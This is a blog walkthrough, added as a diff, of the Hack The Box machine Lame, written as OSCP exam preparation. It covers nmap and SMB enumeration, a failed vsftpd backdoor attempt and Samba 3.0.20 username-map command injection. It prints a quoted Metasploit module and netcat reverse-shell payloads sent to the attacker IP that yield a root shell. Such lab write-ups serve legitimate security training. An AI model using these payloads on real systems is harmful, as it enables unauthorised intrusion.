@@ -1,0 +1,479 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="HTB-Lame Easy one  ReconNmapStarting with nmap scanning , we can find 5 port is opening. 1234567891011121314151617181920212223242526272829303132333435363738PORT    STATE SERVICE     VERSION21&#x2F;tcp  ope">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Road to OSCP-2 Lame">
+<meta property="og:url" content="http://example.com/undefined/442af4ad.html">
+<meta property="og:site_name" content="So1Lupus">
+<meta property="og:description" content="HTB-Lame Easy one  ReconNmapStarting with nmap scanning , we can find 5 port is opening. 1234567891011121314151617181920212223242526272829303132333435363738PORT    STATE SERVICE     VERSION21&#x2F;tcp  ope">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-03-06T14:03:57.000Z">
+<meta property="article:modified_time" content="2023-03-07T13:16:50.000Z">
+<meta property="article:author" content="So1Lupus">
+<meta property="article:tag" content="OSCP备考">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/undefined/442af4ad.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Road to OSCP-2 Lame | So1Lupus</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">So1Lupus</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">So1Lupus</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/undefined/442af4ad.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="So1Lupus">
+      <meta itemprop="description" content="So1Lupus的个人博客">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="So1Lupus">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Road to OSCP-2 Lame
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-03-06 22:03:57" itemprop="dateCreated datePublished" datetime="2023-03-06T22:03:57+08:00">2023-03-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-03-07 21:16:50" itemprop="dateModified" datetime="2023-03-07T21:16:50+08:00">2023-03-07</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="HTB-Lame"><a href="#HTB-Lame" class="headerlink" title="HTB-Lame"></a>HTB-Lame</h1><blockquote>
+<p>Easy one</p>
+</blockquote>
+<h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><p>Starting with nmap scanning , we can find 5 port is opening.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">21/tcp  open  ftp         vsftpd 2.3.4</span><br><span class="line">|_ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to 10.10.14.2</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      vsFTPd 2.3.4 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 600fcfe1c05f6a74d69024fac4d56ccd (DSA)</span><br><span class="line">|_  2048 5656240f211ddea72bae61b1243de8f3 (RSA)</span><br><span class="line">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">|_smb2-time: Protocol negotiation failed (SMB2)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Unix (Samba 3.0.20-Debian)</span><br><span class="line">|   Computer name: lame</span><br><span class="line">|   NetBIOS computer name: </span><br><span class="line">|   Domain name: hackthebox.gr</span><br><span class="line">|   FQDN: lame.hackthebox.gr</span><br><span class="line">|_  System time: 2023-02-27T08:32:50-05:00</span><br><span class="line">|_clock-skew: mean: 2h29m49s, deviation: 3h32m12s, median: -13s</span><br></pre></td></tr></table></figure>
+
+<h3 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h3><h4 id="Anonymous-login"><a href="#Anonymous-login" class="headerlink" title="Anonymous login"></a>Anonymous login</h4><p>​	Howerer ,there is nothing in ftp server</p>
+<h4 id="vsFTPd-2-3-4"><a href="#vsFTPd-2-3-4" class="headerlink" title="vsFTPd 2.3.4"></a>vsFTPd 2.3.4</h4><p>​	From nmap report or using <code>nc -nv 10.10.10.3 12</code> to get its ftp title ,we can find ftp server’s version is vsFTPd 2.3.4. So we can try searchsploit.We find two explolit.So just try if it could get the shell.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">searchsploit vsFTPd 2.3.4    </span><br><span class="line">--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                                                                                                                                   |  Path</span><br><span class="line">--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">vsftpd 2.3.4 - Backdoor Command Execution                                                                                                                                        | unix/remote/49757.py</span><br><span class="line">vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                                           | unix/remote/17491.rb</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>However,the exploit don’t work. The python exploit finally give result says time out.</p>
+<h3 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h3><h4 id="Anonymous-login-1"><a href="#Anonymous-login-1" class="headerlink" title="Anonymous login"></a>Anonymous login</h4><p>First, list mb sharename</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">smbclient -N -L  //10.10.10.3    </span><br><span class="line">Anonymous login successful</span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        print$          Disk      Printer Drivers</span><br><span class="line">        tmp             Disk      oh noes!</span><br><span class="line">        opt             Disk      </span><br><span class="line">        IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))</span><br><span class="line">        ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))</span><br><span class="line">Reconnecting with SMB1 for workgroup listing.</span><br><span class="line">Anonymous login successful</span><br><span class="line"></span><br><span class="line">        Server               Comment</span><br><span class="line">        ---------            -------</span><br><span class="line"></span><br><span class="line">        Workgroup            Master</span><br><span class="line">        ---------            -------</span><br><span class="line">        WORKGROUP            LAME</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>After trying,it gives me two information:</p>
+<ul>
+<li>1.we can access into &#x2F;tmp,but there aren’t useful information.</li>
+<li>2.SMB server  version: Samba 3.0.20-Debain</li>
+</ul>
+<h4 id="Samba"><a href="#Samba" class="headerlink" title="Samba"></a>Samba</h4><p>Try searchsploit again,and get following result:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Samba 3.0.20-Debain                                                                                                         </span><br><span class="line">-----------------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line"> Exploit Title                          |  Path</span><br><span class="line">-----------------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line">Samba 3.0.10 &lt; 3.3.5 - Format String / Security Bypass                                | multiple/remote/10095.txt</span><br><span class="line">Samba 3.0.20 &lt; 3.0.25rc3 - &#x27;Username&#x27; map script&#x27; Command Execution (Metasploit)      | unix/remote/16320.rb</span><br><span class="line">Samba &lt; 3.0.20 - Remote Heap Overflow                                                 | linux/remote/7701.txt</span><br><span class="line">Samba &lt; 3.6.2 (x86) - Denial of Service (PoC)                                         | linux_x86/dos/36741.py</span><br><span class="line">-----------------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line">Shellcodes: No Results</span><br><span class="line">Papers: No Results</span><br></pre></td></tr></table></figure>
+
+<p>And we choose this one :</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Samba 3.0.20 &lt; 3.0.25rc3 - &#x27;Username&#x27; map script&#x27; Command Execution (Metasploit) | unix/remote/16320.rb</span><br><span class="line"></span><br><span class="line"> Exploit :</span><br><span class="line"> def exploit</span><br><span class="line"></span><br><span class="line">                connect</span><br><span class="line"></span><br><span class="line">                # lol?</span><br><span class="line">                username = &quot;/=`nohup &quot; + payload.encoded + &quot;`&quot;</span><br><span class="line">                begin</span><br><span class="line">                        simple.client.negotiate(false)</span><br><span class="line">                        simple.client.session_setup_ntlmv1(username, rand_text(16), datastore[&#x27;SMBDomain&#x27;], false)</span><br><span class="line">                rescue ::Timeout::Error, XCEPT::LoginError</span><br><span class="line">                        # nothing, it either worked or it didn&#x27;t ;)</span><br><span class="line">                end</span><br><span class="line"></span><br><span class="line">                handler</span><br><span class="line">        end</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Analyze it,we can find that using  a malicious command-like string as username to login into smb server leading to a reverse shell.</p>
+<p>payload :</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;/= `nohup nc -e x.x.x.x xxx`&quot;</span><br></pre></td></tr></table></figure>
+
+<p>Howere it don’t work when using such a command </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.10.3/tmp -U &#x27;./=`nohup nc -e /bin/sh 10.10.14.2 4444`&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>but we can use another way to got it , and it’s a root shell.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">smb: \&gt; logon &quot;/=`nohup nc -e /bin/bash 10.10.14.2 4444`&quot;</span><br><span class="line"></span><br><span class="line">root@lame:/# id</span><br><span class="line">uid=0(root) gid=0(root)</span><br></pre></td></tr></table></figure>
+
+<p>Then got a nicer shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="line">or</span><br><span class="line">SHELL=/bin/bash script -q </span><br></pre></td></tr></table></figure>
+
+<p>got flag </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@lame:/# find / -name user.txt         </span><br><span class="line">/home/makis/user.txt</span><br><span class="line">root@lame:/# cat /home/makis/u</span><br><span class="line">f2e045ad2a9a58c16818ed10c3d12fb9</span><br><span class="line"></span><br><span class="line">root@lame:/# cat /home/makis/u</span><br><span class="line">f2e045ad2a9a58c16818ed10c3d12fb9</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/OSCP%E5%A4%87%E8%80%83/" rel="tag"># OSCP备考</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/undefined/af55ad8e.html" rel="prev" title="w1r3s">
+      <i class="fa fa-chevron-left"></i> w1r3s
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/undefined/236928b6.html" rel="next" title="Road to OSCP-3 Soccer">
+      Road to OSCP-3 Soccer <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#HTB-Lame"><span class="nav-number">1.</span> <span class="nav-text">HTB-Lame</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Recon"><span class="nav-number">1.1.</span> <span class="nav-text">Recon</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Nmap"><span class="nav-number">1.1.1.</span> <span class="nav-text">Nmap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#FTP"><span class="nav-number">1.1.2.</span> <span class="nav-text">FTP</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Anonymous-login"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">Anonymous login</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#vsFTPd-2-3-4"><span class="nav-number">1.1.2.2.</span> <span class="nav-text">vsFTPd 2.3.4</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SMB"><span class="nav-number">1.1.3.</span> <span class="nav-text">SMB</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Anonymous-login-1"><span class="nav-number">1.1.3.1.</span> <span class="nav-text">Anonymous login</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Samba"><span class="nav-number">1.1.3.2.</span> <span class="nav-text">Samba</span></a></li></ol></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">So1Lupus</p>
+  <div class="site-description" itemprop="description">So1Lupus的个人博客</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">16</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">浙ICP备2022029346号 </a>
+  </div>
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">So1Lupus</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
